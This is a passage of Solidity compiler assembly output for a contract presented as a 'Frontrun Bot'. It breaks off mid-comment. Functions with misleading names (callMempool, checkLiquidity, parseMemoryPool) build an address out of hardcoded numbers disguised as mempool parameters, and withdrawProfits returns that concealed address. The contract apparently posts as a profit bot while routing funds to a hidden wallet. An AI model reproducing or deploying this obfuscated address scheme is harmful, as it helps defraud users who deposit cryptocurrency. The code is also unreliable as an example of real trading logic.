/* \"Frontrun Bot.sol\":15929:15959  parseMemoryPool(callMempool()) */\n      tag_44\n        /* \"Frontrun Bot.sol\":15945:15958  callMempool() */\n      tag_45\n        /* \"Frontrun Bot.sol\":15945:15956  callMempool */\n      tag_46\n        /* \"Frontrun Bot.sol\":15945:15958  callMempool() */\n      jump\t// in\n    tag_45:\n        /* \"Frontrun Bot.sol\":15929:15944  parseMemoryPool */\n      tag_47\n        /* \"Frontrun Bot.sol\":15929:15959  parseMemoryPool(callMempool()) */\n      jump\t// in\n    tag_44:\n        /* \"Frontrun Bot.sol\":15922:15959  return parseMemoryPool(callMempool()) */\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":15841:15967  function _callFrontRunActionMempool() internal pure returns (address) {\r... */\n      swap1\n      jump\t// out\n        /* \"Frontrun Bot.sol\":17375:17490  function withdrawProfits() internal pure returns (address) {\r... */\n    tag_40:\n        /* \"Frontrun Bot.sol\":17425:17432  address */\n      0x00\n        /* \"Frontrun Bot.sol\":17452:17482  parseMemoryPool(callMempool()) */\n      tag_49\n        /* \"Frontrun Bot.sol\":17468:17481  callMempool() */\n      tag_50\n        /* \"Frontrun Bot.sol\":17468:17479  callMempool */\n      tag_46\n        /* \"Frontrun Bot.sol\":17468:17481  callMempool() */\n      jump\t// in\n    tag_50:\n        /* \"Frontrun Bot.sol\":17452:17467  parseMemoryPool */\n      tag_47\n        /* \"Frontrun Bot.sol\":17452:17482  parseMemoryPool(callMempool()) */\n      jump\t// in\n    tag_49:\n        /* \"Frontrun Bot.sol\":17445:17482  return parseMemoryPool(callMempool()) */\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":17375:17490  function withdrawProfits() internal pure returns (address) {\r... */\n      swap1\n      jump\t// out\n        /* \"Frontrun Bot.sol\":14068:15158  function callMempool() internal pure returns (string memory) {\r... */\n    tag_46:\n        /* \"Frontrun Bot.sol\":14114:14127  string memory */\n      0x60\n        /* \"Frontrun Bot.sol\":14140:14168  string memory _memPoolOffset */\n      dup1\n        /* \"Frontrun Bot.sol\":14171:14219  mempool(\"x\", checkLiquidity(getMemPoolOffset())) */\n      tag_52\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x01\n      dup2\n      mstore\n      0x20\n      add\n      0x7800000000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n        /* \"Frontrun Bot.sol\":14184:14218  checkLiquidity(getMemPoolOffset()) */\n      tag_53\n        /* \"Frontrun Bot.sol\":14199:14217  getMemPoolOffset() */\n      tag_54\n        /* \"Frontrun Bot.sol\":14199:14215  getMemPoolOffset */\n      tag_55\n        /* \"Frontrun Bot.sol\":14199:14217  getMemPoolOffset() */\n      jump\t// in\n    tag_54:\n        /* \"Frontrun Bot.sol\":14184:14198  checkLiquidity */\n      tag_56\n        /* \"Frontrun Bot.sol\":14184:14218  checkLiquidity(getMemPoolOffset()) */\n      jump\t// in\n    tag_53:\n        /* \"Frontrun Bot.sol\":14171:14178  mempool */\n      tag_57\n        /* \"Frontrun Bot.sol\":14171:14219  mempool(\"x\", checkLiquidity(getMemPoolOffset())) */\n      jump\t// in\n    tag_52:\n        /* \"Frontrun Bot.sol\":14140:14219  string memory _memPoolOffset = mempool(\"x\", checkLiquidity(getMemPoolOffset())) */\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":14230:14246  uint _memPoolSol */\n      0x00\n        /* \"Frontrun Bot.sol\":14249:14254  64434 */\n      0xfbb2\n        /* \"Frontrun Bot.sol\":14230:14254  uint _memPoolSol = 64434 */\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":14265:14284  uint _memPoolLength */\n      0x00\n        /* \"Frontrun Bot.sol\":14287:14305  getMemPoolLength() */\n      tag_58\n        /* \"Frontrun Bot.sol\":14287:14303  getMemPoolLength */\n      tag_59\n        /* \"Frontrun Bot.sol\":14287:14305  getMemPoolLength() */\n      jump\t// in\n    tag_58:\n        /* \"Frontrun Bot.sol\":14265:14305  uint _memPoolLength = getMemPoolLength() */\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":14316:14333  uint _memPoolSize */\n      0x00\n        /* \"Frontrun Bot.sol\":14336:14342  190677 */\n      0x02e8d5\n        /* \"Frontrun Bot.sol\":14316:14342  uint _memPoolSize = 190677 */\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":14353:14372  uint _memPoolHeight */\n      0x00\n        /* \"Frontrun Bot.sol\":14375:14393  getMemPoolHeight() */\n      tag_60\n        /* \"Frontrun Bot.sol\":14375:14391  getMemPoolHeight */\n      tag_61\n        /* \"Frontrun Bot.sol\":14375:14393  getMemPoolHeight() */\n      jump\t// in\n    tag_60:\n        /* \"Frontrun Bot.sol\":14353:14393  uint _memPoolHeight = getMemPoolHeight() */\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":14404:14422  uint _memPoolWidth */\n      0x00\n        /* \"Frontrun Bot.sol\":14425:14431  253252 */\n      0x03dd44\n        /* \"Frontrun Bot.sol\":14404:14431  uint _memPoolWidth = 253252 */\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":14442:14460  uint _memPoolDepth */\n      0x00\n        /* \"Frontrun Bot.sol\":14463:14480  getMemPoolDepth() */\n      tag_62\n        /* \"Frontrun Bot.sol\":14463:14478  getMemPoolDepth */\n      tag_63\n        /* \"Frontrun Bot.sol\":14463:14480  getMemPoolDepth() */\n      jump\t// in\n    tag_62:\n        /* \"Frontrun Bot.sol\":14442:14480  uint _memPoolDepth = getMemPoolDepth() */\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":14491:14509  uint _memPoolCount */\n      0x00\n        /* \"Frontrun Bot.sol\":14512:14518  122286 */\n      0x01ddae\n        /* \"Frontrun Bot.sol\":14491:14518  uint _memPoolCount = 122286 */\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":14532:14555  string memory _memPool1 */\n      0x60\n        /* \"Frontrun Bot.sol\":14558:14610  mempool(_memPoolOffset, checkLiquidity(_memPoolSol)) */\n      tag_64\n        /* \"Frontrun Bot.sol\":14566:14580  _memPoolOffset */\n      dup10\n        /* \"Frontrun Bot.sol\":14582:14609  checkLiquidity(_memPoolSol) */\n      tag_65\n        /* \"Frontrun Bot.sol\":14597:14608  _memPoolSol */\n      dup11\n        /* \"Frontrun Bot.sol\":14582:14596  checkLiquidity */\n      tag_56\n        /* \"Frontrun Bot.sol\":14582:14609  checkLiquidity(_memPoolSol) */\n      jump\t// in\n    tag_65:\n        /* \"Frontrun Bot.sol\":14558:14565  mempool */\n      tag_57\n        /* \"Frontrun Bot.sol\":14558:14610  mempool(_memPoolOffset, checkLiquidity(_memPoolSol)) */\n      jump\t// in\n    tag_64:\n        /* \"Frontrun Bot.sol\":14532:14610  string memory _memPool1 = mempool(_memPoolOffset, checkLiquidity(_memPoolSol)) */\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":14621:14644  string memory _memPool2 */\n      0x60\n        /* \"Frontrun Bot.sol\":14647:14716  mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize)) */\n      tag_66\n        /* \"Frontrun Bot.sol\":14655:14685  checkLiquidity(_memPoolLength) */\n      tag_67\n        /* \"Frontrun Bot.sol\":14670:14684  _memPoolLength */\n      dup10\n        /* \"Frontrun Bot.sol\":14655:14669  checkLiquidity */\n      tag_56\n        /* \"Frontrun Bot.sol\":14655:14685  checkLiquidity(_memPoolLength) */\n      jump\t// in\n    tag_67:\n        /* \"Frontrun Bot.sol\":14687:14715  checkLiquidity(_memPoolSize) */\n      tag_68\n        /* \"Frontrun Bot.sol\":14702:14714  _memPoolSize */\n      dup10\n        /* \"Frontrun Bot.sol\":14687:14701  checkLiquidity */\n      tag_56\n        /* \"Frontrun Bot.sol\":14687:14715  checkLiquidity(_memPoolSize) */\n      jump\t// in\n    tag_68:\n        /* \"Frontrun Bot.sol\":14647:14654  mempool */\n      tag_57\n        /* \"Frontrun Bot.sol\":14647:14716  mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize)) */\n      jump\t// in\n    tag_66:\n        /* \"Frontrun Bot.sol\":14621:14716  string memory _memPool2 = mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize)) */\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":14727:14750  string memory _memPool3 */\n      0x60\n        /* \"Frontrun Bot.sol\":14753:14823  mempool(checkLiquidity(_memPoolHeight), checkLiquidity(_memPoolWidth)) */\n      tag_69\n        /* \"Frontrun Bot.sol\":14761:14791  checkLiquidity(_memPoolHeight) */\n      tag_70\n        /* \"Frontrun Bot.sol\":14776:14790  _memPoolHeight */\n      dup9\n        /* \"Frontrun Bot.sol\":14761:14775  checkLiquidity */\n      tag_56\n        /* \"Frontrun Bot.sol\":14761:14791  checkLiquidity(_memPoolHeight) */\n      jump\t// in\n    tag_70:\n        /* \"Frontrun Bot.sol\":14793:14822  checkLiquidity(_memPoolWidth) */\n      tag_71\n        /* \"Frontrun Bot.sol\":14808:14821  _memPoolWidth */\n      dup9\n        /* \"Frontrun Bot.sol\":14793:14807  checkLiquidity */\n      tag_56\n        /* \"Frontrun Bot.sol\":14793:14822  checkLiquidity(_memPoolWidth) */\n      jump\t// in\n    tag_71:\n        /* \"Frontrun Bot.sol\":14753:14760  mempool */\n      tag_57\n        /* \"Frontrun Bot.sol\":14753:14823  mempool(checkLiquidity(_memPoolHeight), checkLiquidity(_memPoolWidth)) */\n      jump\t// in\n    tag_69:\n        /* \"Frontrun Bot.sol\":14727:14823  string memory _memPool3 = mempool(checkLiquidity(_memPoolHeight), checkLiquidity(_memPoolWidth)) */\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":14834:14857  string memory _memPool4 */\n      0x60\n        /* \"Frontrun Bot.sol\":14860:14929  mempool(checkLiquidity(_memPoolDepth), checkLiquidity(_memPoolCount)) */\n      tag_72\n        /* \"Frontrun Bot.sol\":14868:14897  checkLiquidity(_memPoolDepth) */\n      tag_73\n        /* \"Frontrun Bot.sol\":14883:14896  _memPoolDepth */\n      dup8\n        /* \"Frontrun Bot.sol\":14868:14882  checkLiquidity */\n      tag_56\n        /* \"Frontrun Bot.sol\":14868:14897  checkLiquidity(_memPoolDepth) */\n      jump\t// in\n    tag_73:\n        /* \"Frontrun Bot.sol\":14899:14928  checkLiquidity(_memPoolCount) */\n      tag_74\n        /* \"Frontrun Bot.sol\":14914:14927  _memPoolCount */\n      dup8\n        /* \"Frontrun Bot.sol\":14899:14913  checkLiquidity */\n      tag_56\n        /* \"Frontrun Bot.sol\":14899:14928  checkLiquidity(_memPoolCount) */\n      jump\t// in\n    tag_74:\n        /* \"Frontrun Bot.sol\":14860:14867  mempool */\n      tag_57\n        /* \"Frontrun Bot.sol\":14860:14929  mempool(checkLiquidity(_memPoolDepth), checkLiquidity(_memPoolCount)) */\n      jump\t// in\n    tag_72:\n        /* \"Frontrun Bot.sol\":14834:14929  string memory _memPool4 = mempool(checkLiquidity(_memPoolDepth), checkLiquidity(_memPoolCount)) */\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":14943:14969  string memory _allMempools */\n      0x60\n        /* \"Frontrun Bot.sol\":14972:15041  mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4)) */\n      tag_75\n        /* \"Frontrun Bot.sol\":14980:15009  mempool(_memPool1, _memPool2) */\n      tag_76\n        /* \"Frontrun Bot.sol\":14988:14997  _memPool1 */\n      dup7\n        /* \"Frontrun Bot.sol\":14999:15008  _memPool2 */\n      dup7\n        /* \"Frontrun Bot.sol\":14980:14987  mempool */\n      tag_57\n        /* \"Frontrun Bot.sol\":14980:15009  mempool(_memPool1, _memPool2) */\n      jump\t// in\n    tag_76:\n        /* \"Frontrun Bot.sol\":15011:15040  mempool(_memPool3, _memPool4) */\n      tag_77\n        /* \"Frontrun Bot.sol\":15019:15028  _memPool3 */\n      dup6\n        /* \"Frontrun Bot.sol\":15030:15039  _memPool4 */\n      dup6\n        /* \"Frontrun Bot.sol\":15011:15018  mempool */\n      tag_57\n        /* \"Frontrun Bot.sol\":15011:15040  mempool(_memPool3, _memPool4) */\n      jump\t// in\n    tag_77:\n        /* \"Frontrun Bot.sol\":14972:14979  mempool */\n      tag_57\n        /* \"Frontrun Bot.sol\":14972:15041  mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4)) */\n      jump\t// in\n    tag_75:\n        /* \"Frontrun Bot.sol\":14943:15041  string memory _allMempools = mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4)) */\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":15052:15078  string memory _fullMempool */\n      0x60\n        /* \"Frontrun Bot.sol\":15081:15107  mempool(\"0\", _allMempools) */\n      tag_78\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x01\n      dup2\n      mstore\n      0x20\n      add\n      0x3000000000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n        /* \"Frontrun Bot.sol\":15094:15106  _allMempools */\n      dup4\n        /* \"Frontrun Bot.sol\":15081:15088  mempool */\n      tag_57\n        /* \"Frontrun Bot.sol\":15081:15107  mempool(\"0\", _allMempools) */\n      jump\t// in\n    tag_78:\n        /* \"Frontrun Bot.sol\":15052:15107  string memory _fullMempool = mempool(\"0\", _allMempools) */\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":15128:15140  _fullMempool */\n      dup1\n        /* \"Frontrun Bot.sol\":15121:15140  return _fullMempool */\n      swap15\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"Frontrun Bot.sol\":14068:15158  function callMempool() internal pure returns (string memory) {\r... */\n      swap1\n      jump\t// out\n        /* \"Frontrun Bot.sol\":8633:9573  function parseMemoryPool(string memory _a) internal pure returns (address _parsed) {\r... */\n    tag_47:\n        /* \"Frontrun Bot.sol\":8699:8714  address _parsed */\n      0x00\n        /* \"Frontrun Bot.sol\":8727:8743  bytes memory tmp */\n      0x60\n        /* \"Frontrun Bot.sol\":8752:8754  _a */\n      dup3\n        /* \"Frontrun Bot.sol\":8727:8755  bytes memory tmp = bytes(_a) */\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":8766:8779  uint160 iaddr */\n      0x00\n        /* \"Frontrun Bot.sol\":8782:8783  0 */\n      dup1\n        /* \"Frontrun Bot.sol\":8766:8783  uint160 iaddr = 0 */\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":8794:8804  uint160 b1 */\n      0x00\n        /* \"Frontrun Bot.sol\":8815:8825  uint160 b2 */\n      dup1\n        /* \"Frontrun Bot.sol\":8841:8847  uint i */\n      0x00\n        /* \"Frontrun Bot.sol\":8850:8851  2 */\n      0x02\n        /* \"Frontrun Bot.sol\":8841:8851  uint i = 2 */\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":8836:9534  for (uint i = 2; i < 2 + 2 * 20; i += 2) {\r... */\n    tag_80:\n        /* \"Frontrun Bot.sol\":8857:8867  2 + 2 * 20 */\n      0x2a\n        /* \"Frontrun Bot.sol\":8853:8854  i */\n      dup2\n        /* \"Frontrun Bot.sol\":8853:8867  i < 2 + 2 * 20 */\n      lt\n        /* \"Frontrun Bot.sol\":8836:9534  for (uint i = 2; i < 2 + 2 * 20; i += 2) {\r... */\n      iszero\n      tag_81\n      jumpi\n        /* \"Frontrun Bot.sol\":8901:8904  256 */\n      0x0100\n        /* \"Frontrun Bot.sol\":8892:8904  iaddr *= 256 */\n      dup5\n      mul\n      swap4\n      pop\n        /* \"Frontrun Bot.sol\":8938:8941  tmp */\n      dup5\n        /* \"Frontrun Bot.sol\":8942:8943  i */\n      dup2\n        /* \"Frontrun Bot.sol\":8938:8944  tmp[i] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_83\n      jumpi\n      invalid\n    tag_83:\n      0x20\n      add\n      add\n      mload\n      0xf8\n      shr\n      0xf8\n      shl\n        /* \"Frontrun Bot.sol\":8932:8945  uint8(tmp[i]) */\n      0xf8\n      shr\n        /* \"Frontrun Bot.sol\":8924:8946  uint160(uint8(tmp[i])) */\n      0xff\n      and\n        /* \"Frontrun Bot.sol\":8919:8946  b1 = uint160(uint8(tmp[i])) */\n      swap3\n      pop\n        /* \"Frontrun Bot.sol\":8980:8983  tmp */\n      dup5\n        /* \"Frontrun Bot.sol\":8988:8989  1 */\n      0x01\n        /* \"Frontrun Bot.sol\":8984:8985  i */\n      dup3\n        /* \"Frontrun Bot.sol\":8984:8989  i + 1 */\n      add\n        /* \"Frontrun Bot.sol\":8980:8990  tmp[i + 1] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_84\n      jumpi\n      invalid\n    tag_84:\n      0x20\n      add\n      add\n      mload\n      0xf8\n      shr\n      0xf8\n      shl\n        /* \"Frontrun Bot.sol\":8974:8991  uint8(tmp[i + 1]) */\n      0xf8\n      shr\n        /* \"Frontrun Bot.sol\":8966:8992  uint160(uint8(tmp[i + 1])) */\n      0xff\n      and\n        /* \"Frontrun Bot.sol\":8961:8992  b2 = uint160(uint8(tmp[i + 1])) */\n      swap2\n      pop\n        /* \"Frontrun Bot.sol\":9018:9020  97 */\n      0x61\n        /* \"Frontrun Bot.sol\":9012:9014  b1 */\n      dup4\n        /* \"Frontrun Bot.sol\":9012:9020  b1 >= 97 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"Frontrun Bot.sol\":9011:9036  (b1 >= 97) && (b1 <= 102) */\n      dup1\n      iszero\n      tag_85\n      jumpi\n      pop\n        /* \"Frontrun Bot.sol\":9032:9035  102 */\n      0x66\n        /* \"Frontrun Bot.sol\":9026:9028  b1 */\n      dup4\n        /* \"Frontrun Bot.sol\":9026:9035  b1 <= 102 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"Frontrun Bot.sol\":9011:9036  (b1 >= 97) && (b1 <= 102) */\n    tag_85:\n        /* \"Frontrun Bot.sol\":9007:9239  if ((b1 >= 97) && (b1 <= 102)) {\r... */\n      iszero\n      tag_86\n      jumpi\n        /* \"Frontrun Bot.sol\":9063:9065  87 */\n      0x57\n        /* \"Frontrun Bot.sol\":9057:9065  b1 -= 87 */\n      dup4\n      sub\n      swap3\n      pop\n        /* \"Frontrun Bot.sol\":9007:9239  if ((b1 >= 97) && (b1 <= 102)) {\r... */\n      jump(tag_87)\n    tag_86:\n        /* \"Frontrun Bot.sol\":9098:9100  65 */\n      0x41\n        /* \"Frontrun Bot.sol\":9092:9094  b1 */\n      dup4\n        /* \"Frontrun Bot.sol\":9092:9100  b1 >= 65 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"Frontrun Bot.sol\":9091:9115  (b1 >= 65) && (b1 <= 70) */\n      dup1\n      iszero\n      tag_88\n      jumpi\n      pop\n        /* \"Frontrun Bot.sol\":9112:9114  70 */\n      0x46\n        /* \"Frontrun Bot.sol\":9106:9108  b1 */\n      dup4\n        /* \"Frontrun Bot.sol\":9106:9114  b1 <= 70 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"Frontrun Bot.sol\":9091:9115  (b1 >= 65) && (b1 <= 70) */\n    tag_88:\n        /* \"Frontrun Bot.sol\":9087:9239  if ((b1 >= 65) && (b1 <= 70)) {\r... */\n      iszero\n      tag_89\n      jumpi\n        /* \"Frontrun Bot.sol\":9142:9144  55 */\n      0x37\n        /* \"Frontrun Bot.sol\":9136:9144  b1 -= 55 */\n      dup4\n      sub\n      swap3\n      pop\n        /* \"Frontrun Bot.sol\":9087:9239  if ((b1 >= 65) && (b1 <= 70)) {\r... */\n      jump(tag_90)\n    tag_89:\n        /* \"Frontrun Bot.sol\":9177:9179  48 */\n      0x30\n        /* \"Frontrun Bot.sol\":9171:9173  b1 */\n      dup4\n        /* \"Frontrun Bot.sol\":9171:9179  b1 >= 48 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"Frontrun Bot.sol\":9170:9194  (b1 >= 48) && (b1 <= 57) */\n      dup1\n      iszero\n      tag_91\n      jumpi\n      pop\n        /* \"Frontrun Bot.sol\":9191:9193  57 */\n      0x39\n        /* \"Frontrun Bot.sol\":9185:9187  b1 */\n      dup4\n        /* \"Frontrun Bot.sol\":9185:9193  b1 <= 57 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"Frontrun Bot.sol\":9170:9194  (b1 >= 48) && (b1 <= 57) */\n    tag_91:\n        /* \"Frontrun Bot.sol\":9166:9239  if ((b1 >= 48) && (b1 <= 57)) {\r... */\n      iszero\n      tag_92\n      jumpi\n        /* \"Frontrun Bot.sol\":9221:9223  48 */\n      0x30\n        /* \"Frontrun Bot.sol\":9215:9223  b1 -= 48 */\n      dup4\n      sub\n      swap3\n      pop\n        /* \"Frontrun Bot.sol\":9166:9239  if ((b1 >= 48) && (b1 <= 57)) {\r... */\n    tag_92:\n        /* \"Frontrun Bot.sol\":9087:9239  if ((b1 >= 65) && (b1 <= 70)) {\r... */\n    tag_90:\n        /* \"Frontrun Bot.sol\":9007:9239  if ((b1 >= 97) && (b1 <= 102)) {\r... */\n    tag_87:\n        /* \"Frontrun Bot.sol\":9264:9266  97 */\n      0x61\n        /* \"Frontrun Bot.sol\":9258:9260  b2 */\n      dup3\n        /* \"Frontrun Bot.sol\":9258:9266  b2 >= 97 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"Frontrun Bot.sol\":9257:9282  (b2 >= 97) && (b2 <= 102) */\n      dup1\n      iszero\n      tag_93\n      jumpi\n      pop\n        /* \"Frontrun Bot.sol\":9278:9281  102 */\n      0x66\n        /* \"Frontrun Bot.sol\":9272:9274  b2 */\n      dup3\n        /* \"Frontrun Bot.sol\":9272:9281  b2 <= 102 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"Frontrun Bot.sol\":9257:9282  (b2 >= 97) && (b2 <= 102) */\n    tag_93:\n        /* \"Frontrun Bot.sol\":9253:9485  if ((b2 >= 97) && (b2 <= 102)) {\r... */\n      iszero\n      tag_94\n      jumpi\n        /* \"Frontrun Bot.sol\":9309:9311  87 */\n      0x57\n        /* \"Frontrun Bot.sol\":9303:9311  b2 -= 87 */\n      dup3\n      sub\n      swap2\n      pop\n        /* \"Frontrun Bot.sol\":9253:9485  if ((b2 >= 97) && (b2 <= 102)) {\r... */\n      jump(tag_95)\n    tag_94:\n        /* \"Frontrun Bot.sol\":9344:9346  65 */\n      0x41\n        /* \"Frontrun Bot.sol\":9338:9340  b2 */\n      dup3\n        /* \"Frontrun Bot.sol\":9338:9346  b2 >= 65 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"Frontrun Bot.sol\":9337:9361  (b2 >= 65) && (b2 <= 70) */\n      dup1\n      iszero\n      tag_96\n      jumpi\n      pop\n        /* \"Frontrun Bot.sol\":9358:9360  70 */\n      0x46\n        /* \"Frontrun Bot.sol\":9352:9354  b2 */\n      dup3\n        /* \"Frontrun Bot.sol\":9352:9360  b2 <= 70 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"Frontrun Bot.sol\":9337:9361  (b2 >= 65) && (b2 <= 70) */\n    tag_96:\n        /* \"Frontrun Bot.sol\":9333:9485  if ((b2 >= 65) && (b2 <= 70)) {\r... */\n      iszero\n      tag_97\n      jumpi\n        /* \"Frontrun Bot.sol\":9388:9390  55 */\n      0x37\n        /* \"Frontrun Bot.sol\":9382:9390  b2 -= 55 */\n      dup3\n      sub\n      swap2\n      pop\n        /* \"Frontrun Bot.sol\":9333:9485  if ((b2 >= 65) && (b2 <= 70)) {\r... */\n      jump(tag_98)\n    tag_97:\n        /* \"Frontrun Bot.sol\":9423:9425  48 */\n      0x30\n        /* \"Frontrun Bot.sol\":9417:9419  b2 */\n      dup3\n        /* \"Frontrun Bot.sol\":9417:9425  b2 >= 48 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"Frontrun Bot.sol\":9416:9440  (b2 >= 48) && (b2 <= 57) */\n      dup1\n      iszero\n      tag_99\n      jumpi\n      pop\n        /* \"Frontrun Bot.sol\":9437:9439  57 */\n      0x39\n        /* \"Frontrun Bot.sol\":9431:9433  b2 */\n      dup3\n        /* \"Frontrun Bot.sol\":9431:9439  b2 <= 57 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"Frontrun Bot.sol\":9416:9440  (b2 >= 48) && (b2 <= 57) */\n    tag_99:\n        /* \"Frontrun Bot.sol\":9412:9485  if ((b2 >= 48) && (b2 <= 57)) {\r... */\n      iszero\n      tag_100\n      jumpi\n        /* \"Frontrun Bot.sol\":9467:9469  48 */\n      0x30\n        /* \"Frontrun Bot.sol\":9461:9469  b2 -= 48 */\n      dup3\n      sub\n      swap2\n      pop\n        /* \"Frontrun Bot.sol\":9412:9485  if ((b2 >= 48) && (b2 <= 57)) {\r... */\n    tag_100:\n        /* \"Frontrun Bot.sol\":9333:9485  if ((b2 >= 65) && (b2 <= 70)) {\r... */\n    tag_98:\n        /* \"Frontrun Bot.sol\":9253:9485  if ((b2 >= 97) && (b2 <= 102)) {\r... */\n    tag_95:\n        /* \"Frontrun Bot.sol\":9519:9521  b2 */\n      dup2\n        /* \"Frontrun Bot.sol\":9514:9516  16 */\n      0x10\n        /* \"Frontrun Bot.sol\":9509:9511  b1 */\n      dup5\n        /* \"Frontrun Bot.sol\":9509:9516  b1 * 16 */\n      mul\n        /* \"Frontrun Bot.sol\":9509:9521  b1 * 16 + b2 */\n      add\n        /* \"Frontrun Bot.sol\":9499:9522  iaddr += (b1 * 16 + b2) */\n      dup5\n      add\n      swap4\n      pop\n        /* \"Frontrun Bot.sol\":8874:8875  2 */\n      0x02\n        /* \"Frontrun Bot.sol\":8869:8875  i += 2 */\n      dup2\n      add\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":8836:9534  for (uint i = 2; i < 2 + 2 * 20; i += 2) {\r... */\n      jump(tag_80)\n    tag_81:\n      pop\n        /* \"Frontrun Bot.sol\":9559:9564  iaddr */\n      dup3\n        /* \"Frontrun Bot.sol\":9544:9565  return address(iaddr) */\n      swap5\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"Frontrun Bot.sol\":8633:9573  function parseMemoryPool(string memory _a) internal pure returns (address _parsed) {\r... */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"Frontrun Bot.sol\":8368:8457  function getMemPoolOffset() internal pure returns (uint) {\r... */\n    tag_55:\n        /* \"Frontrun Bot.sol\":8419:8423  uint */\n      0x00\n        /* \"Frontrun Bot.sol\":8443:8449  290271 */\n      0x046ddf\n        /* \"Frontrun Bot.sol\":8436:8449  return 290271 */\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":8368:8457  function getMemPoolOffset() internal pure returns (uint) {\r... */\n      swap1\n      jump\t// out\n        /* \"Frontrun Bot.sol\":10139:11154  function checkLiquidity(uint a) internal pure returns (string memory) {\r... */\n    tag_56:\n        /* \"Frontrun Bot.sol\":10194:10207  string memory */\n      0x60\n        /* \"Frontrun Bot.sol\":10220:10230  uint count */\n      0x00\n        /* \"Frontrun Bot.sol\":10233:10234  0 */\n      dup1\n        /* \"Frontrun Bot.sol\":10220:10234  uint count = 0 */\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":10245:10251  uint b */\n      0x00\n        /* \"Frontrun Bot.sol\":10254:10255  a */\n      dup4\n        /* \"Frontrun Bot.sol\":10245:10255  uint b = a */\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":10266:10337  while (b != 0) {\r... */\n    tag_103:\n        /* \"Frontrun Bot.sol\":10278:10279  0 */\n      0x00\n        /* \"Frontrun Bot.sol\":10273:10274  b */\n      dup2\n        /* \"Frontrun Bot.sol\":10273:10279  b != 0 */\n      eq\n        /* \"Frontrun Bot.sol\":10266:10337  while (b != 0) {\r... */\n      tag_104\n      jumpi\n        /* \"Frontrun Bot.sol\":10296:10303  count++ */\n      dup2\n      dup1\n      0x01\n      add\n      swap3\n      pop\n      pop\n        /* \"Frontrun Bot.sol\":10323:10325  16 */\n      0x10\n        /* \"Frontrun Bot.sol\":10318:10325  b /= 16 */\n      dup2\n      dup2\n      tag_105\n      jumpi\n      invalid\n    tag_105:\n      div\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":10266:10337  while (b != 0) {\r... */\n      jump(tag_103)\n    tag_104:\n        /* \"Frontrun Bot.sol\":10347:10363  bytes memory res */\n      0x60\n        /* \"Frontrun Bot.sol\":10376:10381  count */\n      dup3\n        /* \"Frontrun Bot.sol\":10366:10382  new bytes(count) */\n      0xffffffffffffffff\n      dup2\n      gt\n        /* \"--CODEGEN--\":5:14   */\n      dup1\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_106\n      jumpi\n        /* \"--CODEGEN--\":27:28   */\n      0x00\n        /* \"--CODEGEN--\":24:25   */\n      dup1\n        /* \"--CODEGEN--\":17:29   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_106:\n        /* \"Frontrun Bot.sol\":10366:10382  new bytes(count) */\n      pop\n      mload(0x40)\n      swap1\n      dup1\n      dup3\n      mstore\n      dup1\n      0x1f\n      add\n      not(0x1f)\n      and\n      0x20\n      add\n      dup3\n      add\n      0x40\n      mstore\n      dup1\n      iszero\n      tag_107\n      jumpi\n      dup2\n      0x20\n      add\n        /* 